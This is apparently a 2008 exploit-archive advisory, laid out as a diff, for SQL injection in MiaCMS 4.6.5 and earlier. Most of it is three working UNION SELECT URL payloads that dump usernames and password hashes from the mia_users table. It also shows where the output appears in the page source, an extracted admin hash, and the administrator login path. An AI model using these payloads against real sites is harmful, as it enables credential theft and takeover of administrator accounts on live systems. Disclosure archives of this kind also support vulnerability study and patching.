@@ -1,0 +1,38 @@
+MiaCMS <= 4.6.5 SQL Injection Vulnerability
+
+Author: ~!Dok_tOR!~
+Contact: coder5(at)topmail.kz 
+Home Page: www.antichat.ru
+Date found: 24.08.08
+Product: MiaCMS
+Version: 4.6.5
+Download script: http://miacms.googlecode.com/files/MiaCMS_v4.6.5.tar.gz
+Vulnerability Class: SQL Injection
+
+
+Exploit 1:
+
+index.php?option=com_content&task=view&id=-9999999+union+select+1,concat_ws(0x3a,username,password)+from+mia_users/*&Itemid=9
+
+Exploit 2:
+
+index.php?option=com_content&task=category&sectionid=doktor&id=-9999999+union+select+1,concat_ws(0x3a,username,password)+from+mia_users/*&Itemid=27
+
+Exploit 3:
+
+index.php?option=com_content&task=blogsection&id=-9999999+union+select+1,concat_ws(0x3a,username,password)+from+mia_users/*&Itemid=9
+
+
+Opera -> Source(Ctrl+F3)
+
+<div class="moduletable">
+
+...
+
+onclick="window.open('http://digg.com/submit?phase=3&amp;url='+encodeURIComponent(location.href)+'&amp;bodytext=This+site+uses+MiaCMS+-+the+free%2C+open+source+content+management+system+admin%3A21232f297a57a5a743894a0e4a801fc3&amp;
+
+admin:21232f297a57a5a743894a0e4a801fc3
+
+http://localhost/[installdir]/administrator/
+
+# milw0rm.com [2008-08-24]
